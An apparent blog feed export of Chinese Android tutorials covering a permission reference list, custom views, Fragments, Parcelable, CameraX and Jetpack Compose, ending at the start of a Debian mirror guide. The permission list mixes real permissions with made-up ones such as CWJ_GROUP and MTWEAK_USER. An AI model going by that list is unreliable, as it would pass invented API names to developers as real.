WAP PUSH广播android.permission.BROADCAST_WAP_PUSH，WAP PUSH服务收到后触发一个广播 
拨打电话android.permission.CALL_PHONE，允许程序从非系统拨号器里输入电话号码 
通话权限android.permission.CALL_PRIVILEGED，允许程序拨打电话，替换系统的拨号器界面 
拍照权限android.permission.CAMERA，允许访问摄像头进行拍照 
改变组件状态android.permission.CHANGE_COMPONENT_ENABLED_STATE，改变组件是否启用状态 
改变配置android.permission.CHANGE_CONFIGURATION，允许当前应用改变配置，如定位 
改变网络状态android.permission.CHANGE_NETWORK_STATE，改变网络状态如是否能联网 
改变WiFi多播状态android.permission.CHANGE_WIFI_MULTICAST_STATE，改变WiFi多播状态 
改变WiFi状态android.permission.CHANGE_WIFI_STATE，改变WiFi状态 
清除应用缓存android.permission.CLEAR_APP_CACHE，清除应用缓存 
清除用户数据android.permission.CLEAR_APP_USER_DATA，清除应用的用户数据 
底层访问权限android.permission.CWJ_GROUP，允许CWJ账户组访问底层信息 
手机优化大师扩展权限android.permission.CELL_PHONE_MASTER_EX
控制定位更新android.permission.CONTROL_LOCATION_UPDATES，允许获得移动网络定位信息改变 
删除缓存文件android.permission.DELETE_CACHE_FILES，允许应用删除缓存文件 
删除应用android.permission.DELETE_PACKAGES，允许程序删除应用 
电源管理android.permission.DEVICE_POWER，允许访问底层电源管理 
应用诊断android.permission.DIAGNOSTIC，允许程序到RW到诊断资源 
禁用键盘锁android.permission.DISABLE_KEYGUARD，允许程序禁用键盘锁 
转存系统信息android.permission.DUMP，允许程序获取系统dump信息从系统服务 
状态栏控制android.permission.EXPAND_STATUS_BAR，允许程序扩展或收缩状态栏 
工厂测试模式android.permission.FACTORY_TEST，允许程序运行工厂测试模式 
使用闪光灯android.permission.FLASHLIGHT，允许访问闪光灯 
强制后退android.permission.FORCE_BACK，允许程序强制使用back后退按键，无论Activity是否在顶层 
访问账户Gmail列表android.permission.GET_ACCOUNTS，访问GMail账户列表 
获取应用大小android.permission.GET_PACKAGE_SIZE，获取应用的文件大小 
获取任务信息android.permission.GET_TASKS，允许程序获取当前或最近运行的应用 
允许全局搜索android.permission.GLOBAL_SEARCH，允许程序使用全局搜索功能 
硬件测试android.permission.HARDWARE_TEST，访问硬件辅助设备，用于硬件测试 
注射事件android.permission.INJECT_EVENTS，允许访问本程序的底层事件，获取按键、轨迹球的事件流 
安装定位提供android.permission.INSTALL_LOCATION_PROVIDER，安装定位提供 
安装应用程序android.permission.INSTALL_PACKAGES，允许程序安装应用 
内部系统窗口android.permission.INTERNAL_SYSTEM_WINDOW，允许程序打开内部窗口，不对第三方应用程序开放此权限 
访问网络android.permission.INTERNET，访问网络连接，可能产生GPRS流量 
结束后台进程android.permission.KILL_BACKGROUND_PROCESSES，允许程序调用killBackgroundProcesses(String).方法结束后台进程 
管理账户android.permission.MANAGE_ACCOUNTS，允许程序管理AccountManager中的账户列表 
程序引用android.permission.MANAGE_APP_TOKENS，管理创建、摧毁、Z轴顺序，仅用于系统 
高级权限android.permission.MTWEAK_USER，允许mTweak用户访问高级系统权限 
社区权限android.permission.MTWEAK_FORUM，允许使用mTweak社区权限 
软格式化android.permission.MASTER_CLEAR，允许程序执行软格式化，删除系统配置信息 
修改声音设置android.permission.MODIFY_AUDIO_SETTINGS，修改声音设置信息 
修改电话状态android.permission.MODIFY_PHONE_STATE，修改电话状态，如飞行模式，但不包含替换系统拨号器界面 
格式化文件系统android.permission.MOUNT_FORMAT_FILESYSTEMS，格式化可移动文件系统，比如格式化清空SD卡 
挂载文件系统android.permission.MOUNT_UNMOUNT_FILESYSTEMS，挂载、反挂载外部文件系统 
允许NFC通讯android.permission.NFC，允许程序执行NFC近距离通讯操作，用于移动支持 
永久Activityandroid.permission.PERSISTENT_ACTIVITY，创建一个永久的Activity，该功能标记为将来将被移除 
处理拨出电话android.permission.PROCESS_OUTGOING_CALLS，允许程序监视，修改或放弃播出电话 
读取日程提醒android.permission.READ_CALENDAR，允许程序读取用户的日程信息 
读取联系人android.permission.READ_CONTACTS，允许应用访问联系人通讯录信息 
屏幕截图android.permission.READ_FRAME_BUFFER，读取帧缓存用于屏幕截图 
读取收藏夹和历史记录com.android.browser.permission.READ_HISTORY_BOOKMARKS，读取浏览器收藏夹和历史记录 
读取输入状态 android.permission.READ_INPUT_STATE，读取当前键的输入状态，仅用于系统 
读取系统日志 android.permission.READ_LOGS，读取系统底层日志 
读取电话状态 android.permission.READ_PHONE_STATE，访问电话状态 
读取短信内容 android.permission.READ_SMS，读取短信内容 
读取同步设置 android.permission.READ_SYNC_SETTINGS，读取同步设置，读取Google在线同步设置 
读取同步状态 android.permission.READ_SYNC_STATS，读取同步状态，获得Google在线同步状态 
重启设备 android.permission.REBOOT，允许程序重新启动设备 
开机自动允许 android.permission.RECEIVE_BOOT_COMPLETED，允许程序开机自动运行 
接收彩信 android.permission.RECEIVE_MMS，接收彩信 
接收短信 android.permission.RECEIVE_SMS，接收短信 
接收Wap Push android.permission.RECEIVE_WAP_PUSH，接收WAP PUSH信息 
录音 android.permission.RECORD_AUDIO，录制声音通过手机或耳机的麦克 
排序系统任务 android.permission.REORDER_TASKS，重新排序系统Z轴运行中的任务 
结束系统任务 android.permission.RESTART_PACKAGES，结束任务通过restartPackage(String)方法，该方式将在外来放弃 
发送短信 android.permission.SEND_SMS，发送短信 
设置Activity观察其 android.permission.SET_ACTIVITY_WATCHER，设置Activity观察器一般用于monkey测试 
设置闹铃提醒 com.android.alarm.permission.SET_ALARM，设置闹铃提醒 
设置总是退出 android.permission.SET_ALWAYS_FINISH，设置程序在后台是否总是退出 
设置动画缩放 android.permission.SET_ANIMATION_SCALE，设置全局动画缩放 
设置调试程序 android.permission.SET_DEBUG_APP，设置调试程序，一般用于开发 
设置屏幕方向 android.permission.SET_ORIENTATION，设置屏幕方向为横屏或标准方式显示，不用于普通应用 
设置应用参数 android.permission.SET_PREFERRED_APPLICATIONS，设置应用的参数，已不再工作具体查看addPackageToPreferred(String) 介绍 
设置进程限制 android.permission.SET_PROCESS_LIMIT，允许程序设置最大的进程数量的限制 
设置系统时间 android.permission.SET_TIME，设置系统时间 
设置系统时区 android.permission.SET_TIME_ZONE，设置系统时区 
设置桌面壁纸 android.permission.SET_WALLPAPER，设置桌面壁纸 
设置壁纸建议 android.permission.SET_WALLPAPER_HINTS，设置壁纸建议 
发送永久进程信号 android.permission.SIGNAL_PERSISTENT_PROCESSES，发送一个永久的进程信号 
状态栏控制 android.permission.STATUS_BAR，允许程序打开、关闭、禁用状态栏 
访问订阅内容 android.permission.SUBSCRIBED_FEEDS_READ，访问订阅信息的数据库 
写入订阅内容 android.permission.SUBSCRIBED_FEEDS_WRITE，写入或修改订阅内容的数据库 
显示系统窗口 android.permission.SYSTEM_ALERT_WINDOW，显示系统窗口 
更新设备状态 android.permission.UPDATE_DEVICE_STATS，更新设备状态 
使用证书 android.permission.USE_CREDENTIALS，允许程序请求验证从AccountManager 
使用SIP视频 android.permission.USE_SIP，允许程序使用SIP视频服务 
使用振动 android.permission.VIBRATE，允许振动 
唤醒锁定 android.permission.WAKE_LOCK，允许程序在手机屏幕关闭后后台进程仍然运行 
写入GPRS接入点设置 android.permission.WRITE_APN_SETTINGS，写入网络GPRS接入点设置 
写入日程提醒 android.permission.WRITE_CALENDAR，写入日程，但不可读取 
写入联系人 android.permission.WRITE_CONTACTS，写入联系人，但不可读取 
写入外部存储 android.permission.WRITE_EXTERNAL_STORAGE，允许程序写入外部存储，如SD卡上写文件 
写入Google地图数据 android.permission.WRITE_GSERVICES，允许程序写入Google Map服务数据 
写入收藏夹和历史记录 com.android.browser.permission.WRITE_HISTORY_BOOKMARKS，写入浏览器历史记录或收藏夹，但不可读取 
读写系统敏感设置 android.permission.WRITE_SECURE_SETTINGS，允许程序读写系统安全敏感的设置项 
读写系统设置 android.permission.WRITE_SETTINGS，允许读写系统设置项 
编写短信 android.permission.WRITE_SMS，允许编写短信 
写入在线同步设置 android.permission.WRITE_SYNC_SETTINGS，写入Google在线同步设置
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android自定义控件</title>
    <url>/posts/c99ee595/</url>
    <content><![CDATA[布局和控件的继承关系
引入布局我们可以自定义一个布局，然后把这个布局当作一个控件通过&lt;include layout=&quot;布局文件&quot;&gt;标签实现引入。比如自己设计的标签栏设计为一个布局文件，然后把这个布局文件当作一个控件，然后去引入他。但是，这样子的控件没有统一设定的逻辑，只有样式，没有逻辑程序设计，如果每个调用该布局的都重写一遍逻辑结构，就会有很多的冗杂代码。因此
创建自定义控件实现控件的逻辑自洽。不用再去花更多的代码去重复操作。
新建TitleLayout继承自LinearLayout，让它成为我们自定义的标题栏控件，代码如下所示：
class TitleLayout(context: Context, attrs: AttributeSet) : LinearLayout(context, attrs) &#123; init &#123; LayoutInflater.from(context).inflate(R.layout.title, this) &#125;&#125;
这里我们在TitleLayout的主构造函数中声明了Context和AttributeSet这两个参数，在布局中引入TitleLayout控件时就会调用这个构造函数。然后在init结构体中需要对标题栏布局进行动态加载，这就要借助LayoutInflater来实现了。通过LayoutInflater的from()方法可以构建出一个LayoutInflater对象，然后调用inflate()方法就可以动态加载一个布局文件。inflate()方法接收两个参数：第一个参数是要加载的布局文件的id，这里我们传入R.layout.title；第二个参数是给加载好的布局再添加一个父布局，这里我们想要指定为TitleLayout，于是直接传入this。
然后使用这个自定义控件
&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; &gt;	 &lt;com.example.uicustomviews.TitleLayout	 android:layout_width=&quot;match_parent&quot;	 android:layout_height=&quot;wrap_content&quot; /&gt;&lt;/LinearLayout&gt;
他通过导入包名来使用这个自定义控件。这个自定义控件本质就是一个View的子类，布局文件也是一个View的子类。这里就是将布局文件，添加到自定义控件中。然后用函数去绑定逻辑方法。
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android自定义控件（详解）</title>
    <url>/posts/4713194f/</url>
    <content><![CDATA[在本质上，所有的控件和布局都是View类的子类。也就是说明，在理论上，你可以自己手搓一个控件，也就是自定义控件。而且定义自己的方法和图形，界面等。而这都是可行的。
三种自定义控件自绘控件自绘控件的意思就是，这个View上所展现的内容全部都是我们自己绘制出来的。这是一个完完全全由自己设计的控件
组合控件组合控件的意思就是，我们并不需要自己去绘制视图上显示的内容，而只是用系统原生的控件就好了，但我们可以将几个系统原生的控件组合到一起，这样创建出的控件就被称为组合控件。
继承控件继承控件的意思就是，我们并不需要自己重头去实现一个控件，只需要去继承一个现有的控件，然后在这个控件上增加一些新的功能，就可以形成一个自定义的控件了。这种自定义控件的特点就是不仅能够按照我们的需求加入相应的功能，还可以保留原生控件的所有功能，比如 Android PowerImageView实现，可以播放动画的强大ImageView 这篇文章中介绍的PowerImageView就是一个典型的继承控件。
布局文件转化成view类（三种方式）1.&#x2F;&#x2F;context:上下文, resource:要转换成view对象的layout的id, root:一般传null
            view = View.inflate(context, R.layout.frist_layout, null);//将一个布局文件转换成一个view对象

2.&#x2F;&#x2F;通过LayoutInflater将布局转换成view对象
          view =  LayoutInflater.from(context).inflate(R.layout.frist_layout, null);

3.通过context获取系统服务得到一个LayoutInflater，通过LayoutInflater将一个布局转换为view对象
         LayoutInflater layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);

         view = layoutInflater.inflate(R.layout.frist_layout, null);

从布局文件转化而成的view类，你就可以通过调用他们的控件然后改变其内部方法，属性和逻辑规则来实现对控件的自定义。
详解LayoutInflater.from(context).inflate()LayoutInflater.from(context).inflate()
首先LayoutInflater.from(context)他表示会从上下文中获取一个LayoutInflater的实例对象，这个context就是调用该控件的父类。然后通过这个实例对象调用inflate()方法把布局文件载入为view类。这个方法有几个重载方法，其中主要使用的参数简单的解释一下。
1  int resource  代表需要加载资源的id
2 ViewGroup root 代表资源需要被添加的地方
3 boolean attachToRoot 是否要被添加到root中
4 XmlPullParser parser 代表xml文件。
他主要有两种方式第一种是传入资源布局id，第二种是传入xml文件。分别如图所示1
public View inflate(@LayoutRes int resource, @Nullable ViewGroup root) &#123;	return inflate(resource, root, root != null);&#125;
2
public View inflate(XmlPullParser parser, @Nullable ViewGroup root) &#123;	return inflate(parser, root, root != null);&#125;
实际上这两种方式调用的都是带有attachToRoot的三个参数的重载方法。
public View inflate(@LayoutRes int resource, @Nullable ViewGroup root, boolean attachToRoot) &#123;                final Resources res = getContext().getResources();                if (DEBUG) &#123;                    Log.d(                        TAG, &quot;INFLATING from resource: \&quot;&quot; + res.getResourceName(resource) + &quot;\&quot; (&quot;                                + Integer.toHexString(resource) + &quot;)&quot;                    );                &#125;                final XmlResourceParser parser = res.getLayout(resource);                try &#123;                    return inflate(parser, root, attachToRoot);                &#125; finally &#123;                    parser.close();                &#125;            &#125;

第三个参数指定成false，表示只让我们在父布局中声明的layout属性生效，但不会为这个View添加父布局。因为一旦View有了父布局之后，它就不能再添加到ListView中了

视图绑定有时候为了方便使用，会使用视图绑定首先在app的gradle目录下，配置
viewBinding&#123;	enabled=true&#125;
然后在activity中绑定视图
val binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)
在自定义控件中绑定视图
val binding = TitleBinding.inflate(LayoutInflater.from(context), this, true)
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android开发高级技巧</title>
    <url>/posts/e5a9d9c9/</url>
    <content><![CDATA[全局获取context前提：或许目前你还没有为得不到Context而发愁过，因为我们很多的操作是在Activity中进行的，而Activity本身就是一个Context对象。但是，当应用程序的架构逐渐开始复杂起来的时候，很多逻辑代码将脱离Activity类，但此时你又恰恰需要使用Context，也许这个时候你就会感到有些伤脑筋了。解决：Android提供了一个Application类，每当应用程序启动的时候，系统就会自动将这个类进行初始化。而我们可以定制一个自己的Application类，以便于管理程序内一些全局的状态信息，比如全局Context。
class MyApplication : Application() &#123; 	companion object &#123; 		lateinit var context: Context 	&#125;	 override fun onCreate() &#123;		 super.onCreate()		 context = applicationContext	 &#125;&#125;
这样我们就可以以静态变量的形式获取Context对象了。需要注意的是，将Context设置成静态变量很容易会产生内存泄漏的问题，所以这是一种有风险的做法.但是由于这里获取的不是Activity或Service中的Context，而是Application中的Context，它全局只会存在一份实例，并且在整个应用程序的生命周期内都不会回收，因此是不存在内存泄漏风险的。程序启动的时候应该初始化MyApplication类,在AndroidManifest.xml文件的&lt;application&gt;标签下进行指定android:name=&quot;.MyApplication&quot;.
使用Intent传递对象我们用的一直都是一些基础的数据类型如Int，String之类的。而不能传递我们自定义的对象。因此我们需要使用到序列化
Serializable方式让你的类实现Serializable接口，把对象放入intent时，就是普通的方法intent.putExtra(&quot;person_data&quot;, person)但是取出时需要使用特定的获取方法val person = intent.getSerializableExtra(&quot;person_data&quot;) as Person，这样子才能获得序列化后的对象。注意，虽然你传递的对象内的值都一摸一样，但是这两个对象不是同一个对象。
Parcelable方式class Person : Parcelable &#123;    var name = &quot;&quot;    var age = 0    override fun writeToParcel(parcel: Parcel, flags: Int) &#123;        parcel.writeString(name) // 写出name        parcel.writeInt(age) // 写出age    &#125;    override fun describeContents(): Int &#123;        return 0    &#125;    companion object CREATOR : Parcelable.Creator&lt;Person&gt; &#123;        override fun createFromParcel(parcel: Parcel): Person &#123;            val person = Person()            person.name = parcel.readString() ?: &quot;&quot; // 读取name            person.age = parcel.readInt() // 读取age            return person        &#125;        override fun newArray(size: Int): Array&lt;Person?&gt; &#123;            return arrayOfNulls(size)        &#125;    &#125;&#125;
这种方式更加复杂，他需要实现Parcelable接口，然后重写他的describeContents()和writeToParcel()这两个方法。其中describeContents()方法直接返回0就可以了。而对于writeToParcel需要对他的每个属性使用write***方法,如上所示。除此之外我们还必须在Person类中提供一个名为CREATOR的匿名类实现。接着需要重写createFromParcel()和newArray()这两个方法，在createFromParcel()方法中，我们要创建一个Person对象进行返回，并读取刚才写出的name和age字段。其中name和age都是调用Parcel的readXxx()方法读取到的，注意这里读取的顺序一定要和刚才写出的顺序完全相同。而newArray()方法中的实现就简单多了，只需要调用arrayOfNulls()方法，并使用参数中传入的size作为数组大小，创建一个空的Person数组即可
然后传入intent还是一样的，但是取出时需要使用另外的方法val person =intent.getParcelableExtra(&quot;person_data&quot;) as Person但是这种实现方法过于复杂，所以kotlin实现了简单的语法，只要加上@Parcelize注解即可。前提是所有数据必须封装在对象的主构造函数中，也就是简单的写为data class。对比一下，Serializable的方式较为简单，但由于会把整个对象进行序列化，因此效率会比Parcelable方式低一些，所以在通常情况下，还是更加推荐使用Parcelable的方式来实现Intent传递对象的功能。
定制自己的日志工具]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android音乐专辑图片获取</title>
    <url>/posts/1b5902f7/</url>
    <content><![CDATA[获取android音乐部分可用信息val cursor = appContext.contentResolver.query(            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, arrayOf(                MediaStore.Audio.Media._ID,                MediaStore.Audio.Media.TITLE,                MediaStore.Audio.Media.DATA,                MediaStore.Audio.Media.ALBUM_ID,                MediaStore.Audio.Media.DURATION            ), MediaStore.Audio.Media.DURATION+ &quot;&gt;&#x27;1000&#x27;&quot;, null, null        )        if (cursor != null) &#123;            try &#123;                while (cursor.moveToNext()) &#123;                    val song = Song(                        cursor.getLong(0),                        cursor.getString(1),                        cursor.getString(2),                        cursor.getLong(3),                        cursor.getLong(4),                    )                    _musicList.add(song)                &#125;            &#125; finally &#123;                cursor.close()            &#125;        &#125;    &#125;

在已有Album的基础上获取音乐专辑图片信息override fun getAlbumArt(albumId: Long): Bitmap &#123;        val albumArtUri = ContentUris.withAppendedId(MEDIA_ALBUMART_URI,albumId)        try &#123;            val inputstream = appContext.contentResolver.openInputStream(albumArtUri)            return BitmapFactory.decodeStream(inputstream)        &#125;catch (e: Exception)&#123;            e.printStackTrace()        &#125;        return music_default_art    &#125;]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>Android Media</tag>
      </tags>
  </entry>
  <entry>
    <title>Android（Fragment）</title>
    <url>/posts/9a0619a3/</url>
    <content><![CDATA[Fragment是什么Fragment是一种可以嵌入在Activity当中的UI片段。你可以将Fragment理解成一个迷你型的Activity，虽然这个迷你型的Activity有可能和普通的Activity是一样大的。解决某些问题：一个页面只能展示一个activity，如果要展示另一个的话，需要入栈和出栈。但是一个activity中可以包含很多个fragment。实现了多页面共存。
简单使用
首先为我们的fragment创建两个布局文件如下：
&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;              android:orientation=&quot;vertical&quot;              android:layout_width=&quot;match_parent&quot;              android:layout_height=&quot;match_parent&quot;&gt;    &lt;Button            android:id=&quot;@+id/button&quot;            android:layout_width=&quot;wrap_content&quot;            android:layout_height=&quot;wrap_content&quot;            android:layout_gravity=&quot;center_horizontal&quot;            android:text=&quot;Button&quot;/&gt;&lt;/LinearLayout&gt;
定义一个fragment类
class RightFragment():Fragment()&#123;    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? &#123;        return inflater.inflate(R.layout.right_fragment,container,false)    &#125;&#125;
并重写他的onCreateView方法

与actiivity类似，也很像自定义控件的创建方式。


然后在布局中引入fragment
&lt;fragment           android:id=&quot;@+id/leftFrag&quot;           android:name=&quot;top.zfxt.fragmenttest.LeftFragment&quot;           android:layout_width=&quot;0dp&quot;           android:layout_height=&quot;match_parent&quot;           android:layout_weight=&quot;1&quot;/&gt;
需要注意，他这里使用name属性来引入对应的fragment而在自定义控件中，直接写完整的包名来引入。

完成简单使用


动态引入fragment修改activity中的方法，代码如下
override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        val binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)        val button = findViewById&lt;Button&gt;(R.id.button)        button.setOnClickListener &#123;            replaceFragment(AnotherRightFragment())        &#125;        replaceFragment(RightFragment())    &#125;    private fun replaceFragment(fragment: Fragment)&#123;        val fragmentManager = supportFragmentManager        val transaction = fragmentManager.beginTransaction()        transaction.replace(R.id.rightLayout,fragment)        transaction.commit()    &#125;
其大致为：(1) 创建待添加Fragment的实例。(2) 获取FragmentManager，在Activity中可以直接调用getSupportFragmentManager()方法获取。(3) 开启一个事务，通过调用beginTransaction()方法开启。(4) 向容器内添加或替换Fragment，一般使用replace()方法实现，需要传入容器的id和待添加的Fragment实例。(5) 提交事务，调用commit()方法来完成。
fragment添加到返回栈只需要在事务执行时，添加一行transaction.addToBackStack(null)一般默认为null，这样子，fragment也在返回栈中，点击back后，会退回一个返回栈内容。
fragment和activity交互activity获取fragment的实例：Fragment提供了一个supportFragmentManager，activity通过这个管理器，然后调用findViewById，可以获取到Fragment的具体view然后操作。fragment获取activity实例：它内置了一个getActivity()方法，可以获取。fragment和fragment交互：通过activity中转
Fragment声明周期
他的声明周期与activity很像。当activity处于暂停时，与之关联的fragment也会暂停。fragment除了有和activity几乎一样的回调方法外，还有一些附加的回调方法



方法
解释



onAttach()
当Fragment和Activity建立关联时调用。


onCreateView()
为Fragment创建视图（加载布局）时调用。


onActivityCreated()
确保与Fragment相关联的Activity已经创建完毕时调用。


onDestroyView()
当与Fragment关联的视图被移除时调用。


onDetach()
当Fragment和Activity解除关联时调用。


动态加载布局让系统根据屏幕尺寸自动适配使用什么布局，主要是下面这张表然后通过在res下建立对应的目录：如layout-small,drawable-xxhdpi之类的。如果需要设置更具体的大小限制。可以使用最小宽度限定符(smallest-widthqualifier)使用过程例如：需要设置一个大于600dp而单独使用都布局，就建立一个layout-sw600dp的目录。就是这么简单
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>CameraX的基础使用</title>
    <url>/posts/da221fd9/</url>
    <content><![CDATA[CameraX他的特点是可以不用去申请相机等应用，而是可以直接调用硬件的相机源。当然采用这个或者调用相机都是没有问题的，这取决于你的需求
(如果你希望你的应用程序完全访问设备的相机，并且不用离开应用程序时，例如抖音，学习通)那么使用CameraX是个很好的决定。

导入包

//Camera    val cameraxVersion  = &quot;1.3.0-rc01&quot;    implementation(&quot;androidx.camera:camera-core:$cameraxVersion&quot;)    implementation(&quot;androidx.camera:camera-camera2:$cameraxVersion&quot;)    implementation(&quot;androidx.camera:camera-lifecycle:$cameraxVersion&quot;)    implementation(&quot;androidx.camera:camera-video:$cameraxVersion&quot;)    implementation(&quot;androidx.camera:camera-view:$cameraxVersion&quot;)    implementation(&quot;androidx.camera:camera-extensions:$cameraxVersion&quot;)


申请权限

//这将会声明一个权限请求，它可以被用户看到&lt;uses-feature    android:name=&quot;android.hardware.camera&quot;    android:required=&quot;false&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.CAMERA&quot;/&gt;&lt;uses-permission android:name=&quot;android.permission.RECORD_AUDIO&quot;/&gt;


申请权限和验证权限的代码：

//检测是否获取到了权限，如果没有获取则申请if (!hasRequiredPermissions()) &#123;            ActivityCompat.requestPermissions(                this, CAMERAX_PERMISSIONS, 0            )        &#125;private fun hasRequiredPermissions(): Boolean &#123;        return CAMERAX_PERMISSIONS.all &#123;            ContextCompat.checkSelfPermission(                applicationContext,                it            ) == PackageManager.PERMISSION_GRANTED        &#125;    &#125; //提前将所需要的权限都放在一个目录中companion object &#123;        private val CAMERAX_PERMISSIONS = arrayOf(            Manifest.permission.CAMERA,            Manifest.permission.RECORD_AUDIO        )    &#125;


对于使用CameraX，他当前并不能直接通过开箱即用的compose来使用。而是需要使用到view的方式来实现。


        通过PreviewView来实现拍摄界面关键需要接受一个摄像头控制器：它提供对部分&#x2F;所有设备摄像头的访问，允许将摄像头的生命周期 (打开&#x2F;关闭时)附加到 lifecycleOwner ，并具有应用程序进程的范围 (它是一个单例)。 就如何使用它而言，它是CameraX中的一种低级应用编程接口
        在某种意义上说，当你使用它时，你需要初始化它，创建和配置你的用例 (即 Preview ， ImageAnalysis ， ImageCapture)，将它们绑定到 LifecycleOwner

@Composablefun CameraPreview(    controller: LifecycleCameraController,    modifier: Modifier = Modifier) &#123;    val lifecycleOwner = LocalLifecycleOwner.current    AndroidView(        factory = &#123;            PreviewView(it).apply &#123;                this.controller = controller                controller.bindToLifecycle(lifecycleOwner)            &#125;        &#125;,        modifier = modifier    )&#125;


因为需要传入一个控制器，所以提前在activity使用remember或者直接在viewModel中声明一个controller

val controller = remember &#123;                    //声明需要使用捕获图片和视频的权限                    LifecycleCameraController(applicationContext).apply &#123;                        setEnabledUseCases(                            CameraController.IMAGE_CAPTURE or                                    CameraController.VIDEO_CAPTURE                        )                    &#125;                &#125;


切换摄像头,需要使用到camereSelector这一属性:

IconButton(onClick = &#123;                            controller.cameraSelector =                                if (controller.cameraSelector == CameraSelector.DEFAULT_BACK_CAMERA) &#123;                                    CameraSelector.DEFAULT_FRONT_CAMERA                                &#125; else CameraSelector.DEFAULT_BACK_CAMERA                        &#125;, modifier = Modifier.offset(16.dp, 16.dp)) &#123;                            Icon(                                imageVector = Icons.Default.Cameraswitch,                                contentDescription = &quot;Switch Camera&quot;                            )                        &#125;


拍摄照片

拍摄照片时，单独定义了一个方法，他首先需要检查权限，如果没有权限，将直接退出，不允许使用。他也是调用&#96;controller的拍摄方法，他需要获取主线程，然后设置一个拍摄后的回调函数来实现拍照并存储

ContextCompat 可以理解为是封装了 Context 的一些便捷方法，如加载图片等资源文件

private fun takePhoto(        controller: LifecycleCameraController,        onPhotoTaken: (Bitmap) -&gt; Unit    ) &#123;        if (!hasRequiredPermissions()) &#123;            return        &#125;        controller.takePicture(            ContextCompat.getMainExecutor(applicationContext),            object : OnImageCapturedCallback() &#123;                override fun onCaptureSuccess(image: ImageProxy) &#123;                    super.onCaptureSuccess(image)                    //旋转图片                    val matrix = Matrix().apply &#123;                        postRotate(image.imageInfo.rotationDegrees.toFloat())                        //前置摄像头反转,反转水平，而不反转垂直                        postScale(-1f, 1f)                    &#125;                    val rotatedBitmap = Bitmap.createBitmap(                        image.toBitmap(),                        0, 0,                        image.width, image.height,                        matrix, true                    )                    //                    onPhotoTaken(image.toBitmap())                &#125;                override fun onError(exception: ImageCaptureException) &#123;                    super.onError(exception)                    Log.e(&quot;Camera&quot;, &quot;Couldn&#x27;t take photo:&quot;, exception)                &#125;            &#125;        )    &#125;


拍摄视频

对于视频的拍摄，无法直观的显示出来，因为视频并不像图片一样可以得到bitmap然后直接在内存中存储。因此，在这里我们选择存储到内部存储中。而对于手机而言，只要不是放到公共的空间。是不需要申请存储空间的访问的。
//首先仍然需要记录一个值，用来确定拍照的状态（正在拍摄，或者停止拍摄）private var recording: Recording? = null@SuppressLint(&quot;MissingPermission&quot;)    private fun recordVideo(controller: LifecycleCameraController) &#123;        if (recording != null) &#123;            recording?.stop()            recording = null            return        &#125;        if (!hasRequiredPermissions()) &#123;            return        &#125;        val outputFile = File(filesDir, &quot;my-recording.mp4&quot;)        recording = controller.startRecording(            FileOutputOptions.Builder(outputFile).build(),            AudioConfig.create(true),            ContextCompat.getMainExecutor(applicationContext)        ) &#123; event -&gt;            when (event) &#123;                is VideoRecordEvent.Finalize -&gt; &#123;                    if (event.hasError()) &#123;                        recording?.close()                        recording = null                        Toast.makeText(                            applicationContext,                            &quot;Video capture failed&quot;,                            Toast.LENGTH_LONG                        ).show()                    &#125; else &#123;                        Toast.makeText(                            applicationContext,                            &quot;Video capture succeeded&quot;,                            Toast.LENGTH_LONG                        ).show()                    &#125;                &#125;            &#125;        &#125;    &#125;]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>cameraX</tag>
      </tags>
  </entry>
  <entry>
    <title>Compose 去除点击水波纹阴影效果_局部and全局去除-CompositionLocal实例</title>
    <url>/posts/b17914dc/</url>
    <content><![CDATA[一：针对单个view，去除点击效果，可以在clickable 中添加
indication = null, interactionSource = remember &#123; MutableInteractionSource() &#125;

 二：针对整个Activity,你可以在最root的compose里设置，通过CompositionLocal（让数据流经界面树的一种隐式方式），属性传递，把children就全部替换了  @Composablefun ComposeTheme(    content: @Composable () -&gt; Unit) &#123;    MaterialTheme(colors = LightColorPalette) &#123;                // 设置全局参数，去除默认点击效果        CompositionLocalProvider(            LocalIndication provides NoIndication        ) &#123;            ProvideTextStyle(value = MaterialTheme.typography.body1, content = content)        &#125;    &#125;&#125; // null indicationobject NoIndication : Indication &#123;    private object NoIndicationInstance : IndicationInstance &#123;        override fun ContentDrawScope.drawIndication() &#123;            drawContent()        &#125;    &#125;     @Composable    override fun rememberUpdatedInstance(interactionSource: InteractionSource): IndicationInstance &#123;        return NoIndicationInstance    &#125;&#125;
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>jetpack compose</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian换源至阿里源解决安装报错</title>
    <url>/posts/ef6ef7b2/</url>
    <content><![CDATA[关于我配置我家云然后安装debian时，经常安装报错，因此在这里简单介绍一下如何给debian换源，同时推荐使用阿里源，他会比清华源更加稳定好用。

备份配置文件cp -a /etc/apt/sources.list /etc/apt/sources.list.bak
编辑配置文件vim /etc/apt/sources.list
